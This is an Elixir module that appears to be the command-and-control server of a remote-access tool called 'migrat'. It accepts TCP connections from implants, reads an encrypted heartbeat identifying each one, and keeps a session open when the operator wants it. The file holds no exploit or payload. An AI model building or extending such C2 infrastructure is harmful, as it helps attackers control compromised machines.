defmodule Connections.Server do
  require Logger
  alias Connections.Registry
  alias Connections.Translator
  alias Connections.Handler

  def accept(port) do
    Connections.Registry.start()
    {:ok, socket}
      = :gen_tcp.listen(
        port,
        [:binary, packet: :raw, active: false, reuseaddr: true, send_timeout: 5000, send_timeout_close: true])

    Logger.info("Accepting connctions on port #{port}")
    loop_acceptor(socket)
  end

  defp loop_acceptor(socket) do
    Logger.info("waiting for connection")
    {:ok, client} = :gen_tcp.accept(socket)
      Logger.info("waiting for heartbeart")
      case Translator.read_message(client, Application.fetch_env!(:migrat_c2, :initkey)) do
        {:ok, {:ident, ident}} ->
          entry = Registry.new_heartbeat(ident)
          if entry.wants_connection do
            Logger.info("sending heartbeat response with keepalive")
            Translator.send_message(client, :heartbeat_response, %Migrat.HeartbeatResponse{keep_open: true}, Application.fetch_env!(:migrat_c2, :initkey))
            Handler.start(client, ident)
          else
            Logger.info("sending heartbeat response")
            Translator.send_message(client, :heartbeat_response, %Migrat.HeartbeatResponse{keep_open: false}, Application.fetch_env!(:migrat_c2, :initkey))
          end
          loop_acceptor(socket)
        _ ->
          Logger.info("got bad heartbeat")
          loop_acceptor(socket)
      end
  end
end
